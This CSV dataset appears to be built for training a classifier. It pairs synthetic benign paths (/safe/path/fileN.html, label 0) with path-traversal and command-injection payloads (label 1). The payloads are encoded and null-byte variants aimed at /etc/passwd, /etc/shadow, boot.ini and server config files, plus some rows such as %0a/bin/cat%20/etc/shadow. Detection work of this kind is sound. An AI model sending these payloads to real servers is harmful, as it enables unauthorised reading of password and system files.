Sentence,Label
/safe/path/file515.html,0
/safe/path/file1033.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1706.html,0
/safe/path/file1549.html,0
/safe/path/file1767.html,0
/safe/path/file628.html,0
/safe/path/file1198.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file1005.html,0
/safe/path/file324.html,0
/safe/path/file1209.html,0
/safe/path/file78.html,0
/safe/path/file1396.html,0
/safe/path/file73.html,0
/safe/path/file1438.html,0
/safe/path/file1953.html,0
/safe/path/file22.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file100.html,0
/safe/path/file1050.html,0
/../../../../../../../../bin/id|,1
/safe/path/file732.html,0
/safe/path/file8.html,0
/safe/path/file1756.html,0
/safe/path/file1150.html,0
/safe/path/file116.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file155.html,0
/safe/path/file386.html,0
%00../../../../../../etc/passwd,1
/safe/path/file259.html,0
/safe/path/file1587.html,0
/safe/path/file983.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file1130.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1758.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/passwd,1
/safe/path/file461.html,0
/safe/path/file451.html,0
/safe/path/file1648.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file341.html,0
/safe/path/file1917.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file816.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1725.html,0
/safe/path/file1048.html,0
/../../../../../../../../../../etc/shadow^^,1
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1843.html,0
/safe/path/file215.html,0
/safe/path/file213.html,0
/safe/path/file1385.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1306.html,0
/safe/path/file1540.html,0
/safe/path/file1167.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1841.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file411.html,0
C:/boot.ini,1
/./././././././././././boot.ini,1
/safe/path/file596.html,0
/safe/path/file509.html,0
/safe/path/file5.html,0
C:\inetpub\wwwroot\global.asa,1
C:/boot.ini,1
/.../.../.../.../.../,1
/../../../../../../../../../../../boot.ini%00.jpg,1
../../../../../../../../../../../../etc/hosts%00,1
C:/boot.ini,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file588.html,0
/safe/path/file1024.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file520.html,0
%00/etc/shadow%00,1
/safe/path/file307.html,0
/safe/path/file742.html,0
/safe/path/file1006.html,0
/safe/path/file998.html,0
/safe/path/file1483.html,0
/safe/path/file1902.html,0
/safe/path/file845.html,0
/safe/path/file267.html,0
../../../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
/../../../../../../../../bin/id|,1
/./././././././././././etc/shadow,1
/safe/path/file1553.html,0
/safe/path/file490.html,0
/safe/path/file1035.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1639.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1169.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1228.html,0
/safe/path/file371.html,0
/safe/path/file1641.html,0
../../../../../../../../../../../../etc/passwd,1
../../../../../../../../conf/server.xml,1
/safe/path/file1070.html,0
/safe/path/file1360.html,0
../../../../../../../../../../../../localstart.asp%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file902.html,0
/safe/path/file1545.html,0
/safe/path/file172.html,0
/safe/path/file357.html,0
/safe/path/file346.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1148.html,0
/safe/path/file1377.html,0
/safe/path/file1312.html,0
/safe/path/file1863.html,0
/safe/path/file1102.html,0
/safe/path/file1613.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../etc/shadow,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/./././././././././././boot.ini,1
../../../../../../../../../../../../etc/shadow,1
%00/etc/shadow%00,1
../../boot.ini,1
/safe/path/file287.html,0
/safe/path/file600.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1272.html,0
/safe/path/file1525.html,0
/safe/path/file1217.html,0
C:/inetpub/wwwroot/global.asa,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file1502.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../localstart.asp%00,1
/../../../../../../../../bin/id|,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1270.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file787.html,0
/safe/path/file1289.html,0
/safe/path/file519.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file1900.html,0
/safe/path/file1323.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file249.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file1986.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1803.html,0
/safe/path/file1824.html,0
%00../../../../../../etc/shadow,1
../../../../../../../../../../../../boot.ini%00,1
../../../../../../../../../../../../etc/passwd%00,1
%0a/bin/cat%20/etc/shadow,1
/../../../../../../../../%2A,1
/safe/path/file1383.html,0
/safe/path/file598.html,0
/safe/path/file238.html,0
/safe/path/file268.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file1699.html,0
/safe/path/file1096.html,0
/safe/path/file873.html,0
/../../../../../../../../bin/id|,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1571.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file181.html,0
/safe/path/file1610.html,0
/../../../../../../../../../../etc/shadow^^,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1331.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file97.html,0
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1849.html,0
/safe/path/file916.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file883.html,0
/safe/path/file1250.html,0
/safe/path/file302.html,0
/safe/path/file768.html,0
/safe/path/file769.html,0
/safe/path/file1378.html,0
/safe/path/file1896.html,0
/safe/path/file1927.html,0
/safe/path/file1564.html,0
/safe/path/file1948.html,0
/safe/path/file1290.html,0
/safe/path/file84.html,0
/safe/path/file1678.html,0
/safe/path/file1191.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file733.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/../../../../../../../../../../etc/shadow,1
/safe/path/file1893.html,0
/safe/path/file1689.html,0
C:/boot.ini,1
/safe/path/file1936.html,0
/safe/path/file1818.html,0
/../../../../../../../../../../../boot.ini%00.html,1
%0a/bin/cat%20/etc/shadow,1
/safe/path/file829.html,0
/safe/path/file1906.html,0
../../../../../../../../../../../../etc/hosts,1
/../../../../../../../../bin/id|,1
/safe/path/file1419.html,0
/safe/path/file362.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1389.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
%00../../../../../../etc/shadow,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1711.html,0
../../../../../../../../../../../../etc/passwd%00,1
%00../../../../../../etc/passwd,1
%00../../../../../../etc/shadow,1
/safe/path/file1242.html,0
/safe/path/file1973.html,0
/./././././././././././boot.ini,1
/./././././././././././boot.ini,1
/safe/path/file152.html,0
/safe/path/file702.html,0
%00/etc/passwd%00,1
/safe/path/file1847.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1560.html,0
/safe/path/file718.html,0
%00/etc/passwd%00,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
%00../../../../../../etc/passwd,1
/safe/path/file231.html,0
/safe/path/file1298.html,0
/safe/path/file340.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1207.html,0
../../boot.ini,1
/./././././././././././etc/passwd,1
/safe/path/file1090.html,0
/safe/path/file484.html,0
/./././././././././././etc/passwd,1
C:/boot.ini,1
/safe/path/file1002.html,0
/safe/path/file398.html,0
/safe/path/file1372.html,0
/safe/path/file1575.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file255.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../etc/passwd%00,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file25.html,0
%00../../../../../../etc/passwd,1
/safe/path/file1059.html,0
/safe/path/file853.html,0
%0a/bin/cat%20/etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file568.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file42.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/../../../../../../../../../../etc/passwd^^,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1734.html,0
C:/boot.ini,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file1458.html,0
/safe/path/file1498.html,0
/safe/path/file1211.html,0
/safe/path/file1512.html,0
/./././././././././././etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1276.html,0
/safe/path/file1584.html,0
/safe/path/file684.html,0
/safe/path/file1777.html,0
/./././././././././././etc/shadow,1
/safe/path/file1835.html,0
/safe/path/file263.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1381.html,0
/safe/path/file1562.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
%00/etc/passwd%00,1
/safe/path/file382.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
%00/etc/passwd%00,1
%00../../../../../../etc/passwd,1
../../../../../../../../../../../../localstart.asp%00,1
../../../../../../../../../../../../etc/hosts,1
../../../../../../../../../../../../etc/hosts%00,1
C:\boot.ini,1
/safe/path/file1455.html,0
../../../../../../../../../../../../etc/passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file635.html,0
/safe/path/file1912.html,0
/safe/path/file1134.html,0
/safe/path/file609.html,0
/safe/path/file1334.html,0
/safe/path/file151.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1375.html,0
/safe/path/file1802.html,0
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1261.html,0
/../../../../../../../../bin/id|,1
/safe/path/file1444.html,0
/safe/path/file747.html,0
/safe/path/file337.html,0
%00../../../../../../etc/shadow,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file227.html,0
/../../../../../../../../../../../boot.ini,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file112.html,0
/safe/path/file1892.html,0
/safe/path/file415.html,0
/safe/path/file1957.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1482.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file623.html,0
/safe/path/file119.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file1729.html,0
/safe/path/file1971.html,0
/safe/path/file977.html,0
/safe/path/file921.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file146.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file280.html,0
/safe/path/file1543.html,0
C:/inetpub/wwwroot/global.asa,1
%00../../../../../../etc/passwd,1
%00../../../../../../etc/shadow,1
/safe/path/file1157.html,0
/safe/path/file770.html,0
/safe/path/file1245.html,0
/safe/path/file951.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
../../../../../../../../conf/server.xml,1
/./././././././././././etc/shadow,1
/safe/path/file1416.html,0
../../../../../../../../../../../../etc/hosts,1
/./././././././././././etc/shadow,1
/safe/path/file714.html,0
/safe/path/file289.html,0
/safe/path/file1489.html,0
/safe/path/file541.html,0
/safe/path/file1947.html,0
/safe/path/file1851.html,0
/safe/path/file1064.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1523.html,0
/safe/path/file1258.html,0
/safe/path/file1784.html,0
/safe/path/file722.html,0
/safe/path/file1180.html,0
/safe/path/file1676.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file877.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file1423.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
%00/etc/passwd%00,1
C:\boot.ini,1
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../etc/passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1988.html,0
/safe/path/file1478.html,0
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1083.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file391.html,0
/safe/path/file27.html,0
/safe/path/file1714.html,0
/safe/path/file735.html,0
/../../../../../../../../%2A,1
/../../../../../../../../bin/id|,1
/../../../../../../../../../../etc/passwd,1
/safe/path/file201.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file1684.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1208.html,0
/safe/path/file1053.html,0
/./././././././././././boot.ini,1
%0a/bin/cat%20/etc/passwd,1
/safe/path/file253.html,0
C:/boot.ini,1
/safe/path/file1868.html,0
%00../../../../../../etc/shadow,1
/safe/path/file964.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1826.html,0
/../../../../../../../../%2A,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file841.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1464.html,0
/safe/path/file1433.html,0
/safe/path/file1965.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/../../../../../../../../bin/id|,1
/safe/path/file549.html,0
/safe/path/file1234.html,0
/safe/path/file246.html,0
/safe/path/file1342.html,0
/safe/path/file292.html,0
/safe/path/file1039.html,0
C:/inetpub/wwwroot/global.asa,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file91.html,0
/safe/path/file67.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1233.html,0
C:/inetpub/wwwroot/global.asa,1
../../../../../../../../../../../../etc/shadow%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1439.html,0
/safe/path/file330.html,0
/safe/path/file1652.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file1901.html,0
%00../../../../../../etc/passwd,1
/safe/path/file1165.html,0
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file817.html,0
/safe/path/file1273.html,0
/.../.../.../.../.../,1
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1036.html,0
/safe/path/file1721.html,0
/safe/path/file240.html,0
/safe/path/file1672.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file441.html,0
/safe/path/file1267.html,0
/../../../../../../../../../../etc/shadow^^,1
%00/etc/shadow%00,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file120.html,0
%0a/bin/cat%20/etc/passwd,1
%00/etc/shadow%00,1
/safe/path/file1761.html,0
/safe/path/file1882.html,0
/safe/path/file642.html,0
/safe/path/file752.html,0
/safe/path/file1949.html,0
/./././././././././././etc/shadow,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file345.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
../../../../../../../../../../../../boot.ini,1
../../../../../../../../../../../../localstart.asp%00,1
/../../../../../../../../bin/id|,1
/safe/path/file989.html,0
../../../../../../../../../../../../etc/passwd%00,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../../../../../../../../../../../etc/shadow%00,1
../../../../../../../../conf/server.xml,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file972.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file908.html,0
/safe/path/file265.html,0
/safe/path/file1120.html,0
../../boot.ini,1
/safe/path/file783.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file37.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file379.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file945.html,0
/.../.../.../.../.../,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file1974.html,0
/safe/path/file1643.html,0
/safe/path/file1259.html,0
/safe/path/file595.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1582.html,0
/safe/path/file516.html,0
/safe/path/file293.html,0
/safe/path/file1662.html,0
/safe/path/file856.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1173.html,0
/./././././././././././boot.ini,1
/safe/path/file1805.html,0
/safe/path/file1568.html,0
%00/etc/passwd%00,1
../../../../../../../../../../../../etc/hosts,1
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file232.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file971.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file369.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file629.html,0
/safe/path/file1453.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file905.html,0
/safe/path/file1361.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1450.html,0
/safe/path/file260.html,0
/safe/path/file920.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file708.html,0
C:\inetpub\wwwroot\global.asa,1
../../boot.ini,1
%00/etc/shadow%00,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file56.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
../../../../../../../../../../../../etc/shadow,1
/safe/path/file1607.html,0
/safe/path/file1763.html,0
/./././././././././././etc/shadow,1
/safe/path/file449.html,0
/safe/path/file894.html,0
/safe/path/file842.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1922.html,0
/safe/path/file1253.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file442.html,0
C:/inetpub/wwwroot/global.asa,1
/safe/path/file994.html,0
../../../../../../../../../../../../etc/passwd%00,1
../../../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1517.html,0
%0a/bin/cat%20/etc/passwd,1
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1285.html,0
C:/inetpub/wwwroot/global.asa,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file1719.html,0
/safe/path/file1079.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1814.html,0
/safe/path/file1231.html,0
/safe/path/file402.html,0
/safe/path/file1249.html,0
/safe/path/file569.html,0
/safe/path/file428.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
../../../../../../../../../../../../etc/passwd%00,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1730.html,0
../../../../../../../../../../../../etc/shadow%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1720.html,0
/../../../../../../../../%2A,1
/safe/path/file1627.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1980.html,0
/safe/path/file1970.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1534.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1941.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1984.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file566.html,0
/../../../../../../../../%2A,1
/safe/path/file1384.html,0
/../../../../../../../../%2A,1
/safe/path/file506.html,0
/safe/path/file618.html,0
/safe/path/file912.html,0
../../../../../../../../../../../../boot.ini%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/./././././././././././etc/shadow,1
/safe/path/file408.html,0
/safe/path/file906.html,0
/safe/path/file1156.html,0
/safe/path/file645.html,0
/safe/path/file562.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
C:\boot.ini,1
/safe/path/file1054.html,0
/safe/path/file721.html,0
/safe/path/file530.html,0
/safe/path/file1222.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../bin/id|,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1115.html,0
/safe/path/file1861.html,0
/safe/path/file802.html,0
../../../../../../../../../../../../localstart.asp%00,1
../../boot.ini,1
/safe/path/file33.html,0
%00/etc/shadow%00,1
/safe/path/file1460.html,0
/safe/path/file1418.html,0
../../../../../../../../../../../../etc/passwd%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file1854.html,0
/safe/path/file354.html,0
%0a/bin/cat%20/etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file750.html,0
/safe/path/file15.html,0
/.../.../.../.../.../,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
../../../../../../../../../../../../localstart.asp%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
../../../../../../../../../../../../etc/passwd,1
../../boot.ini,1
/safe/path/file257.html,0
/safe/path/file1712.html,0
/safe/path/file1535.html,0
/safe/path/file730.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file252.html,0
/safe/path/file1650.html,0
/safe/path/file339.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/../../../../../../../../bin/id|,1
/safe/path/file491.html,0
/safe/path/file1693.html,0
%0a/bin/cat%20/etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file526.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../../../etc/passwd,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
%00/etc/passwd%00,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file604.html,0
/safe/path/file763.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file508.html,0
%0a/bin/cat%20/etc/passwd,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file21.html,0
/safe/path/file464.html,0
/safe/path/file1065.html,0
../../../../../../../../../../../../etc/hosts,1
/./././././././././././etc/shadow,1
%00/etc/passwd%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1404.html,0
/safe/path/file308.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file578.html,0
/safe/path/file639.html,0
/safe/path/file1859.html,0
/safe/path/file1113.html,0
/safe/path/file524.html,0
/safe/path/file775.html,0
/../../../../../../../../../../etc/passwd^^,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
/../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/../../../../../../../../bin/id|,1
/safe/path/file781.html,0
/../../../../../../../../../../etc/shadow^^,1
%00../../../../../../etc/passwd,1
/safe/path/file1492.html,0
